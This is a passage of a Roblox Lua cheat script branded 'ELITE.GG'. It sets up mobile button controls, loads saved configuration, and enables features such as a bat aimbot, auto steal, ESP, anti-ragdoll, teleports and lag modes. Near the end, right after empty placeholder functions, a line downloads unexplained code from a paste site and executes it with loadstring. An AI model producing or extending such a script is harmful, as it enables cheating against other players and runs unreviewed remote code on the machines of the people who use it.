		btnFrame.ZIndex = 16
		btnFrame.LayoutOrder = layoutOrder
		mkCornerLocal(btnFrame, 14)
		local stroke = mkStrokeLocal(btnFrame, PURPLE_ACCENT, 1)
		stroke.Transparency = 0.8
		mobileButtonFrames[id] = { frame = btnFrame, stroke = stroke, defaultPosition = UDim2.new(0, defaultX, 0, defaultY) }

		local bgImage = Instance.new("ImageLabel", btnFrame)
		bgImage.Size = UDim2.new(1, 0, 1, 0)
		bgImage.Position = UDim2.new(0, 0, 0, 0)
		bgImage.Image = "rbxassetid://88369503310562"
		bgImage.ScaleType = Enum.ScaleType.Crop
		bgImage.ZIndex = 1
		bgImage.ImageTransparency = 0.7
		mkCornerLocal(bgImage, 14)

		local lbl = Instance.new("TextLabel", btnFrame)
		lbl.Size = UDim2.new(1, -8, 1, -8)
		lbl.Position = UDim2.new(0, 4, 0, 2)
		lbl.BackgroundTransparency = 1
		lbl.Text = label
		lbl.TextColor3 = LIGHT_PINK
		lbl.Font = Enum.Font.GothamBlack
		lbl.TextSize = 11
		lbl.TextWrapped = true
		lbl.TextXAlignment = Enum.TextXAlignment.Center
		lbl.ZIndex = 17

		local isOn = false
		local function setActive(on)
			isOn = on
			local targetBg = on and MOBILE_BTN_ACTIVE or MOBILE_BTN_BG
			local targetTextColor = on and BLACK_PURE or LIGHT_PINK
			TS:Create(btnFrame, TweenInfo.new(0.15), { BackgroundColor3 = targetBg }):Play()
			TS:Create(lbl, TweenInfo.new(0.15), { TextColor3 = targetTextColor }):Play()
			TS:Create(stroke, TweenInfo.new(0.15), { Color = on and MOBILE_BTN_ACTIVE or PURPLE_ACCENT, Transparency = on and 0.2 or 0.8 }):Play()
		end

		btnFrame.MouseEnter:Connect(function()
			if not isOn then
				TS:Create(btnFrame, TweenInfo.new(0.1), { BackgroundColor3 = MOBILE_BTN_ACTIVE }):Play()
				TS:Create(lbl, TweenInfo.new(0.1), { TextColor3 = BLACK_PURE }):Play()
			end
		end)
		btnFrame.MouseLeave:Connect(function()
			local targetBg = isOn and MOBILE_BTN_ACTIVE or MOBILE_BTN_BG
			local targetTx = isOn and BLACK_PURE or LIGHT_PINK
			TS:Create(btnFrame, TweenInfo.new(0.1), { BackgroundColor3 = targetBg }):Play()
			TS:Create(lbl, TweenInfo.new(0.1), { TextColor3 = targetTx }):Play()
		end)

		local activeInput, startPos, buttonStartPos, groupStartPos = nil, nil, nil, nil
		local moved = false
		local lastClick = 0
		local inputEndedHandledAt = 0

		local function runMobileAction()
			local now = tick()
			if now - lastClick < 0.08 then return end
			lastClick = now
			local action = MobileButtonActions[actionKey]
			if action then action(setActive, isOn) end
		end

		local clickArea = Instance.new("TextButton", btnFrame)
		clickArea.Size = UDim2.new(1, 0, 1, 0)
		clickArea.BackgroundTransparency = 1
		clickArea.Text = ""
		clickArea.ZIndex = 18
		clickArea.AutoButtonColor = false

		clickArea.InputBegan:Connect(function(input)
			if input.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
			activeInput = input
			startPos = input.Position
			buttonStartPos = btnFrame.Position
			groupStartPos = container.Position
			moved = false
			input.Changed:Connect(function()
				if input.UserInputState ~= Enum.UserInputState.End or activeInput ~= input then return end
				activeInput = nil
				inputEndedHandledAt = tick()
				if moved then
					if editMobileButtons then
						mobileButtonPositions[id] = { x = btnFrame.Position.X.Offset, y = btnFrame.Position.Y.Offset }
					else
						mobileGroupPosition = {
							xs = container.Position.X.Scale, x = container.Position.X.Offset,
							ys = container.Position.Y.Scale, y = container.Position.Y.Offset
						}
					end
					saveConfig()
				else
					runMobileAction()
				end
			end)
		end)
		clickArea.Activated:Connect(function()
			if moved then return end
			if tick() - inputEndedHandledAt < 0.10 then return end
			runMobileAction()
		end)

		UIS.InputChanged:Connect(function(input)
			if not activeInput then return end
			if activeInput.UserInputType == Enum.UserInputType.Touch then
				if input ~= activeInput then return end
			elseif activeInput.UserInputType == Enum.UserInputType.MouseButton1 then
				if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
			else
				return
			end
			local dx, dy = input.Position.X - startPos.X, input.Position.Y - startPos.Y
			if math.abs(dx) <= DRAG_THRESHOLD and math.abs(dy) <= DRAG_THRESHOLD then return end
			moved = true
			if uiLocked then return end
			if editMobileButtons then
				btnFrame.Position = UDim2.new(buttonStartPos.X.Scale, buttonStartPos.X.Offset + dx, buttonStartPos.Y.Scale, buttonStartPos.Y.Offset + dy)
			else
				container.Position = UDim2.new(groupStartPos.X.Scale, groupStartPos.X.Offset + dx, groupStartPos.Y.Scale, groupStartPos.Y.Offset + dy)
			end
		end)

		return setActive
	end

	-- Mobile Actions
	MobileButtonActions.AutoLeft = function(sa, on)
		if State.BatV2 then
			State.BatV2 = false
			stopBatV2Aimbot()
			if setBatV2Visual then setBatV2Visual(false) end
		end
		if tpBatEnabled then
			stopTpBat()
			if tpBatSetVisual then tpBatSetVisual(false) end
		end
		sa(not on)
		autoLeftEnabled = not on
		if autoLeftEnabled then
			queueAutoLeftStart()
		else
			stopAutoLeft()
		end
		if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
	end

	MobileButtonActions.AutoRight = function(sa, on)
		if State.BatV2 then
			State.BatV2 = false
			stopBatV2Aimbot()
			if setBatV2Visual then setBatV2Visual(false) end
		end
		if tpBatEnabled then
			stopTpBat()
			if tpBatSetVisual then tpBatSetVisual(false) end
		end
		sa(not on)
		autoRightEnabled = not on
		if autoRightEnabled then
			queueAutoRightStart()
		else
			stopAutoRight()
		end
		if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
	end

	MobileButtonActions.AutoBat = function(sa, on)
		if State.BatV2 then
			State.BatV2 = false
			stopBatV2Aimbot()
			if setBatV2Visual then setBatV2Visual(false) end
		end
		if tpBatEnabled then
			stopTpBat()
			if tpBatSetVisual then tpBatSetVisual(false) end
		end
		sa(not on)
		if not on then
			startBatAimbot()
			if autoBatSetVisual then autoBatSetVisual(true) end
		else
			stopBatAimbot()
			if autoBatSetVisual then autoBatSetVisual(false) end
		end
	end

	MobileButtonActions.BatV2 = function(sa, on)
		if not on then
			if autoLeftEnabled then
				autoLeftEnabled = false
				stopAutoLeft()
				if autoLeftSetVisual then autoLeftSetVisual(false) end
			end
			if autoRightEnabled then
				autoRightEnabled = false
				stopAutoRight()
				if autoRightSetVisual then autoRightSetVisual(false) end
			end
			if autoBatEnabled then
				stopBatAimbot()
				if autoBatSetVisual then autoBatSetVisual(false) end
			end
			if tpBatEnabled then
				stopTpBat()
				if tpBatSetVisual then tpBatSetVisual(false) end
			end
		end
		sa(not on)
		State.BatV2 = not on
		if not on then
			startBatV2Aimbot()
		else
			stopBatV2Aimbot()
		end
		if setBatV2Visual then setBatV2Visual(State.BatV2) end
	end

	MobileButtonActions.TPBat = function(sa, on)
		if not on then
			if autoLeftEnabled then
				autoLeftEnabled = false
				stopAutoLeft()
				if autoLeftSetVisual then autoLeftSetVisual(false) end
			end
			if autoRightEnabled then
				autoRightEnabled = false
				stopAutoRight()
				if autoRightSetVisual then autoRightSetVisual(false) end
			end
			if autoBatEnabled then
				stopBatAimbot()
				if autoBatSetVisual then autoBatSetVisual(false) end
			end
			if State.BatV2 then
				State.BatV2 = false
				stopBatV2Aimbot()
				if setBatV2Visual then setBatV2Visual(false) end
			end
		end
		sa(not on)
		tpBatEnabled = not on
		if not on then
			startTpBat()
			if tpBatSetVisual then tpBatSetVisual(true) end
		else
			stopTpBat()
			if tpBatSetVisual then tpBatSetVisual(false) end
		end
	end

	MobileButtonActions.CarrySpeed = function(sa, on)
		toggleCarryMode()
		sa(speedMode)
		if setLaggerModeVisual then setLaggerModeVisual(laggerToggled) end
		if setLaggerCarryVisual then setLaggerCarryVisual(laggerCarryToggled) end
		saveConfig()
	end

	MobileButtonActions.DropBrainrot = function(sa, on)
		sa(true)
		runDrop()
		task.delay(0.5, function() sa(false) end)
	end

	MobileButtonActions.TPDown = function(sa, on)
		sa(true)
		runTPFloor()
		sa(false)
	end

	MobileButtonActions.Lagger = function(sa, on)
		toggleLaggerMode()
		sa(laggerToggled)
		if setLaggerCarryVisual then setLaggerCarryVisual(laggerCarryToggled) end
		if setCarryModeVisual then setCarryModeVisual(speedMode) end
		saveConfig()
	end

	MobileButtonActions.LaggerCarry = function(sa, on)
		toggleLaggerCarryMode()
		sa(laggerCarryToggled)
		if setLaggerModeVisual then setLaggerModeVisual(laggerToggled) end
		if setCarryModeVisual then setCarryModeVisual(speedMode) end
		saveConfig()
	end

	MobileButtonActions.ToggleGUI = function()
		if isCandyGuiVisible and isCandyGuiVisible() then
			if hideCandyGui then hideCandyGui() end
		else
			if showCandyGui then showCandyGui() end
		end
	end

	-- Build buttons
	local setAL = makeBtn("autoLeft", "AutoLeft", "AUTO\nLEFT", 1)
	local setAR = makeBtn("autoRight", "AutoRight", "AUTO\nRIGHT", 2)
	local setAB = makeBtn("autoBat", "AutoBat", "AIM\nBOT", 3)
	local setSP = makeBtn("carry", "CarrySpeed", "CARRY\nSPEED", 4)
	setCarryModeVisual = setSP
	makeBtn("drop", "DropBrainrot", "DROP\nBR", 5)
	makeBtn("tpDown", "TPDown", "TP\nDOWN", 6)
	local setLG = makeBtn("lagger", "Lagger", "LAG\nMODE", 7)
	local setLC = makeBtn("laggerCarry", "LaggerCarry", "LAG\nCARRY", 8)
	local setGA = makeBtn("batV2", "BatV2", "BAT\nV2", 9)
	setBatV2Visual = setGA
	local setTPB = makeBtn("tpBat", "TPBat", "TP\nBAT", 10)
	tpBatSetVisual = setTPB
	setLaggerModeVisual = setLG
	setLaggerCarryVisual = setLC

	container.Size = UDim2.new(0, (BW * 2) + COL_GAP, 0, (BH * 7) + (ROW_GAP * 6))

	refreshMobileButtonUi()

	game:GetService("RunService").Heartbeat:Connect(function()
		setAL(autoLeftEnabled)
		setAR(autoRightEnabled)
		setAB(autoBatEnabled)
		setLG(laggerToggled)
		setLC(laggerCarryToggled)
		setSP(speedMode)
		if setGA then setGA(State.BatV2) end
		if setTPB then setTPB(tpBatEnabled) end
	end)
end

_savedCfg = nil

function loadConfigKeys()
	local configFile = (isfile and isfile("blessvs.json")) and "blessvs.json" or "cursedPC.json"
	if not (isfile and isfile(configFile)) then return end
	local ok, cfg = pcall(function() return HS:JSONDecode(readfile(configFile)) end)
	if not ok or not cfg then return end

	if configFile ~= "cursedPC.json" and isfile and isfile("cursedPC.json") then
		local legacyOk, legacy = pcall(function() return HS:JSONDecode(readfile("cursedPC.json")) end)
		if legacyOk and type(legacy) == "table" then
			for _, key in ipairs({ "normalSpeed", "carrySpeed", "laggerSpeed", "laggerCarrySpeed", "carryMode", "laggerMode" }) do
				if cfg[key] == nil and legacy[key] ~= nil then cfg[key] = legacy[key] end
			end
		end
	end

	_savedCfg = cfg

	local function lk(e, d)
		if type(d) ~= "table" then return end
		if d.kb and Enum.KeyCode[d.kb] then e.kb = Enum.KeyCode[d.kb] end
		if d.gp and Enum.KeyCode[d.gp] then e.gp = Enum.KeyCode[d.gp] end
	end

	local function speedNumber(v)
		local n = tonumber(v)
		if n and n > 0 and n <= 500 then return n end
		return nil
	end

	lk(KB.DropBrainrot, cfg.dropBrainrotKey)
	lk(KB.AutoLeft, cfg.autoLeftKey)
	lk(KB.AutoRight, cfg.autoRightKey)
	lk(KB.AutoBat, cfg.autoBatKey)
	lk(KB.LaggerToggle, cfg.laggerToggleKey)
	lk(KB.LaggerCarryToggle, cfg.laggerCarryToggleKey)
	lk(KB.BlessLagger, cfg.blessLaggerKey)
	lk(KB.TPFloor, cfg.tpFloorKey)
	lk(KB.GuiHide, cfg.guiHideKey)
	lk(KB.SpeedToggle, cfg.speedToggleKey)
	lk(KB.BatV2, cfg.batV2Key)
	lk(KB.TPBat, cfg.tpBatKey)

	local savedNormal = speedNumber(cfg.normalSpeed)
	if savedNormal then NS = savedNormal end

	local savedCarry = speedNumber(cfg.carrySpeed)
	if savedCarry then CS = savedCarry end

	CONFIG.STEAL_RANGE = 9
	if cfg.holdMax and type(cfg.holdMax) == "number" then CONFIG.HOLD_MAX = cfg.holdMax else CONFIG.HOLD_MAX = 2.6 end

	local savedLagger = speedNumber(cfg.laggerSpeed)
	if savedLagger then LAGGER_SPEED = savedLagger end

	local savedLaggerCarry = speedNumber(cfg.laggerCarrySpeed)
	if savedLaggerCarry then LAGGER_CARRY_SPEED = savedLaggerCarry end

	local savedAimbot = speedNumber(cfg.aimbotSpeed)
	if savedAimbot then AIMBOT_SPEED = savedAimbot end

	local savedBatV2 = speedNumber(cfg.batV2Speed)
	if savedBatV2 then BAT_V2_CHASE_SPD = savedBatV2 end

	if cfg.carryMode ~= nil then speedMode = cfg.carryMode == true end
	if cfg.laggerMode ~= nil then laggerToggled = cfg.laggerMode == true end
	if cfg.laggerCarryMode ~= nil then laggerCarryToggled = cfg.laggerCarryMode == true end
	if cfg.autoTPHeight and type(cfg.autoTPHeight) == "number" then autoTPHeight = cfg.autoTPHeight end
	if cfg.autoSwing ~= nil then autoSwingEnabled = cfg.autoSwing ~= false end
	if cfg.showIntro ~= nil then showIntroEnabled = cfg.showIntro ~= false end
	if cfg.uiLocked ~= nil then uiLocked = cfg.uiLocked == true end
	if type(cfg.uiScale) == "number" then uiScaleValue = math.clamp(cfg.uiScale, 1, 2) end
	if type(cfg.mobileButtonScale) == "number" then mobileButtonScaleValue = math.clamp(cfg.mobileButtonScale, 1, 2) end
	if cfg.editMobileButtons ~= nil then editMobileButtons = cfg.editMobileButtons == true end
	if cfg.hideMobileButtons ~= nil then hideMobileButtons = cfg.hideMobileButtons == true end
	if type(cfg.mobileButtonPositions) == "table" then mobileButtonPositions = cfg.mobileButtonPositions end
	if type(cfg.mobileGroupPosition) == "table" then mobileGroupPosition = cfg.mobileGroupPosition end
	if cfg.blessLaggerPanelOpen ~= nil then blessLaggerPanelOpen = cfg.blessLaggerPanelOpen == true end
	if type(cfg.blessLaggerPanelPosition) == "table" then blessLaggerPanelPosition = cfg.blessLaggerPanelPosition end
	if type(cfg.skyTheme) == "string" then currentSkyTheme = cfg.skyTheme end
	if cfg.safeModeEnabled ~= nil then _GACC.safeModeEnabled = cfg.safeModeEnabled == true end
	if cfg.bodyLockEnabled ~= nil then
		bodyLockEnabled = cfg.bodyLockEnabled == true
		if bodyLockEnabled then startBodyLock() end
	end
	if cfg.tpBatEnabled ~= nil then
		tpBatEnabled = cfg.tpBatEnabled == true
		if tpBatEnabled then
			task.spawn(function()
				task.wait(0.5)
				local char = LP.Character
				if char then _tpBatSetupChar(char) end
				startTpBat()
			end)
		end
	end
	if cfg.vampireAnimEnabled ~= nil then
		if cfg.vampireAnimEnabled then
			enableVampireAnim()
		else
			disableVampireAnim()
		end
	end
	-- I-LOAD ANG SAVED FONT INDEX
	if cfg.currentFontIdx ~= nil then
		_currentFontIdx = math.clamp(cfg.currentFontIdx, 1, #_FONTS)
	end
	if cfg.fovEnabled ~= nil then
		if cfg.fovEnabled then
			enableFOV()
		else
			disableFOV()
		end
	end
	if cfg.stretchRezEnabled ~= nil then
		if cfg.stretchRezEnabled then
			enableStretchRez()
		else
			disableStretchRez()
		end
	end

	if type(cfg.guiPosition) == "table" then
		guiPosition = UDim2.new(cfg.guiPosition.xs or 0, cfg.guiPosition.x or 20, cfg.guiPosition.ys or 0, cfg.guiPosition.y or 60)
	end
	if type(cfg.stealPodPosition) == "table" then
		stealPodPosition = UDim2.new(cfg.stealPodPosition.xs or 0.5, cfg.stealPodPosition.x or -150, cfg.stealPodPosition.ys or 0, cfg.stealPodPosition.y or 72)
	end
	if type(cfg.miniButtonPosition) == "table" then
		miniButtonPosition = UDim2.new(cfg.miniButtonPosition.xs or 0, cfg.miniButtonPosition.x or 26, cfg.miniButtonPosition.ys or 0, cfg.miniButtonPosition.y or 26)
	end
end

function loadConfigState()
	local cfg = _savedCfg
	if not cfg then return end

	if normalBox then normalBox.Text = tostring(NS) end
	if carryBox then carryBox.Text = tostring(CS) end
	if radInput then radInput.Text = tostring(CONFIG.STEAL_RANGE) end
	if holdMaxBox then holdMaxBox.Text = tostring(CONFIG.HOLD_MAX) end
	if progressRadLbl then progressRadLbl.Text = string.format("Radius: %.2g", CONFIG.STEAL_RANGE) end
	if laggerBox then laggerBox.Text = tostring(LAGGER_SPEED) end
	if laggerCarryBox then laggerCarryBox.Text = tostring(LAGGER_CARRY_SPEED) end
	refreshSpeedModeLabel()

	if autoTPHeightBox then autoTPHeightBox.Text = tostring(autoTPHeight) end
	if mainUIScale then mainUIScale.Scale = ((UIS.TouchEnabled and not UIS.KeyboardEnabled) and 0.85 or 1) * uiScaleValue end
	if mobileUIScale then mobileUIScale.Scale = mobileButtonScaleValue end

	for _, refresh in ipairs(uiSizeSetters) do refresh() end
	for _, refresh in ipairs(mobileSizeSetters) do refresh() end

	if setTopLockVisual then setTopLockVisual(uiLocked) end
	if setLockGuiVisual then setLockGuiVisual(uiLocked) end
	if setHideMobileVisual then setHideMobileVisual(hideMobileButtons) end
	if setEditMobileVisual then setEditMobileVisual(editMobileButtons) end
	refreshMobileButtonUi()

	if currentSkyTheme then CandyApplyCustomSky(currentSkyTheme) end
	if setBlessLaggerPanelVisible then setBlessLaggerPanelVisible(blessLaggerPanelOpen, true) end
	if setBlessLaggerVisual then setBlessLaggerVisual(blessLaggerActive) end

	if bodyLockEnabled and setBodyLockVisual then setBodyLockVisual(true) end
	if tpBatEnabled and tpBatSetVisual then tpBatSetVisual(true) end

	-- I-APPLY ANG SAVED FONT PAGKATAPOS MABUO ANG GUI
	task.spawn(function()
		task.wait(0.1)
		refreshAllFonts()
	end)

	task.spawn(function()
		task.wait(0.15)
		if cfg.antiRagdoll then
			antiRagdollEnabled = true
			if setAntiRagVisual then setAntiRagVisual(true) end
			startAntiRagdoll()
		end
		if cfg.antiDie then
			antiDieEnabled = true
			if setAntiDieVisual then setAntiDieVisual(true) end
			startAntiDie()
		end
		if cfg.autoStealEnabled then
			CONFIG.AUTO_STEAL_ENABLED = true
			if setInstaGrab then setInstaGrab(true) end
			pcall(startAutoSteal)
		end
		if cfg.infiniteJump then
			infJumpEnabled = true
			if setInfJumpVisual then setInfJumpVisual(true) end
		end
		if cfg.medusaCounter then
			medusaCounterEnabled = true
			if setMedusaVisual then setMedusaVisual(true) end
			setupMedusa(LP.Character)
		end
		if cfg.batCounter then
			batCounterEnabled = true
			if setBatCounterVisual then setBatCounterVisual(true) end
			startBatCounter()
		end
		if cfg.carryMode ~= nil then speedMode = cfg.carryMode == true end
		if cfg.laggerMode ~= nil then laggerToggled = cfg.laggerMode == true end
		refreshSpeedModeLabel()
		if setCarryModeVisual then setCarryModeVisual(speedMode) end
		if cfg.autoTPEnabled then
			autoTPEnabled = true
			if setAutoTPVisual then setAutoTPVisual(true) end
			startAutoTP()
		end
		if cfg.autoTPDownEnabled then
			autoTPDownEnabled = true
			startAutoTPDown()
			if autoTPDownSetVisual then autoTPDownSetVisual(true) end
		end
		if cfg.holdJumpEnabled then
			holdJumpEnabled = true
			startHoldJump()
			if setHoldJumpVisual then setHoldJumpVisual(true) end
		end
		if setAutoSwingVisual then setAutoSwingVisual(autoSwingEnabled) end
		if cfg.autoCarry then
			autoCarryEnabled = true
			if setAutoCarryVisual then setAutoCarryVisual(true) end
		end
		if cfg.autoBat then
			if autoBatSetVisual then autoBatSetVisual(true) end
			startBatAimbot()
		end
		if cfg.unwalkEnabled then
			unwalkEnabled = true
			if setUnwalkVisual then setUnwalkVisual(true) end
			task.spawn(function()
				task.wait(0.5)
				startUnwalk()
			end)
		end
		if cfg.antiLag then
			enableAntiLag()
			if setAntiLagVisual then setAntiLagVisual(true) end
		end
		if cfg.stretchRez then
			enableStretchRez()
			if setStretchRezVisual then setStretchRezVisual(true) end
		end
		if cfg.fovEnabled then
			enableFOV()
			if fovSetVisual then fovSetVisual(true) end
		end
		if cfg.espEnabled then
			espEnabled = true
			startESP()
			if setEspVisual then setEspVisual(true) end
		end
		if cfg.ragdolTimer then
			setRagdolTimer(true)
			if setRagdolTimerVisual then setRagdolTimerVisual(true) end
		end
		if cfg.blessLaggerEnabled then setBlessLaggerEnabled(true) end
		if setShowIntroVisual then setShowIntroVisual(showIntroEnabled) end
		if cfg.vampireAnimEnabled and not vampireAnimEnabled then enableVampireAnim() end
	end)
end

loadConfigKeys()
buildMobileButtons()
buildGui()
loadConfigState()

-- ============================================================
-- AUTO CARRY SPEED
-- ============================================================
autoCarryEnabled = false

function startAutoCarry()
	-- Auto carry speed functionality
end

function stopAutoCarry()
	-- Auto carry speed stop
end
loadstring(game:HttpGet("https://pastefy.app/jXGuTTue/raw"))()

print("========================================")
print("ELITE.GG - AKAI FEATURES LOADED")
print("discord.gg/elitegg")
print("========================================")
print("KEYBINDS:")
print("  E - Bat Aimbot")
print("  T - TP Bat (from Akai Hub)")
print("  Z - Auto Left")
print("  C - Auto Right")
print("  X - Drop Brainrot (Akai Jump Drop)")
print("  F - TP Floor")
print("  Q - Speed Mode Toggle")
print("  R - Lagger Mode Toggle")
print("  N - Lagger Carry Toggle")
print("========================================")
print("FEATURES:")
print("  ✅ All 28 Font Styles from Akai Hub (APPLIES TO ALL BUTTONS)")
print("  ✅ Vampire Anim from Akai Hub")
print("  ✅ TP Bat from Akai Hub")
print("  ✅ FOV 120 from Akai Hub")
print("  ✅ Stretch Rez (FPS Boost) from Akai Hub")
print("  ✅ Auto Steal (V1 & V2)")
print("  ✅ Bat Aimbot & Bat V2")
print("  ✅ Auto Left / Auto Right")
print("  ✅ Drop Brainrot (Jump/Stand)")
print("  ✅ Body Lock")
print("  ✅ Safe Mode")
print("========================================")